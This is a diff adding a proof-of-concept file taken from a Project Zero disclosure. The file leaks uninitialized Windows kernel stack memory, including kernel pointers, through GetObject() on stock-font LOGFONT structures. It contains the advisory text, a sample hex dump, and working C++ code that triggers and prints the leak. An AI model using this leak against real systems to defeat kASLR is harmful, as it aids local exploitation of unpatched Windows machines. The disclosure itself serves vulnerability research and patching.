@@ -1,0 +1,81 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1178
+
+We have discovered that it is possible to disclose portions of uninitialized kernel stack memory in Windows 7-10 through the win32k!NtGdiExtGetObjectW system call (accessible via a documented GetObject() API function) to user-mode applications.
+
+The reason for this seems to be as follows: logical fonts in Windows are described by the LOGFONT structure [1]. One of the structure's fields is lfFaceName, a 32-character array containing the typeface name. Usually when logical fonts are created (e.g. with the CreateFont() or CreateFontIndirect() user-mode functions), a large part of the array remains uninitialized, as most font names are shorter than the maximum length. For instance, the CreateFont() API only copies the relevant string up until \0, and leaves the rest of its local LOGFONT structure untouched. In case of CreateFontIndirect(), it is mostly up to the caller to make sure there are no leftover bytes in the structure, but we expect this is rarely paid attention to. The structure is then copied to kernel-mode address space, but can be read back using the GetObject() function, provided that the program has a GDI handle to the logical font.
+
+Now, it turns out that the trailing, uninitialized bytes of the LOGFONT structure for some of the stock fonts contain left-over kernel stack data, which include kernel pointers, among other potentially interesting information. An example output of the attached proof-of-concept program (which obtains and displays the LOGFONT of the DEVICE_DEFAULT_FONT stock font) started on Windows 7 32-bit is as follows:
+
+--- cut ---
+00000000: 10 00 00 00 07 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: bc 02 00 00 00 00 00 ee 01 02 02 22 53 00 79 00 ..........."S.y.
+00000020: 73 00 74 00 65 00 6d 00 00 00 29 92 24 86 6d 81 s.t.e.m...).$.m.
+00000030: fb 4d f2 ad fe ff ff ff 63 76 86 81 76 79 86 81 .M......cv..vy..
+00000040: 10 38 c7 94 02 00 00 00 00 00 00 00 01 00 00 00 .8..............
+00000050: d0 03 69 81 10 38 c7 94 04 7a 00 00 ?? ?? ?? ?? ..i..8...z......
+--- cut ---
+
+After the "System" unicode string, we can observe data typical to a function stack frame: a _EH3_EXCEPTION_REGISTRATION structure at offset 0x28:
+
+.Next             = 0x9229???? (truncated)
+.ExceptionHandler = 0x816d8624
+.ScopeTable       = 0xadf24dfb
+.TryLevel         = 0xfffffffe
+
+as well as pointers to the ntoskrnl.exe kernel image (0x81867663, 0x81867976, 0x816903d0) and paged pool (0x94c73810). This information is largely useful for local attackers seeking to defeat the kASLR exploit mitigation, and the bug might also allow disclosing other sensitive data stored in the kernel address space. We have confirmed that more data can be easily leaked by querying other stock fonts. It is unclear whether disclosing junk stack data from other user-mode processes which create logical fonts is possible, but this scenario should also be investigated and addressed if necessary.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  // Get a handle to the stock font.
+  HFONT hfont = (HFONT)GetStockObject(DEVICE_DEFAULT_FONT);
+  if (hfont == NULL) {
+    printf("GetCurrentObject failed\n");
+    return 1;
+  }
+
+  // Zero-out the logfont memory to prevent any artifacts in the output.
+  LOGFONT logfont;
+  RtlZeroMemory(&logfont, sizeof(logfont));
+
+  // Trigger the bug.
+  if (GetObject(hfont, sizeof(logfont), &logfont) == 0) {
+    printf("GetObject failed\n");
+    DeleteObject(hfont);
+    return 1;
+  }
+
+  // Dump the output on screen.
+  PrintHex((PBYTE)&logfont, sizeof(logfont));
+
+  return 0;
+}
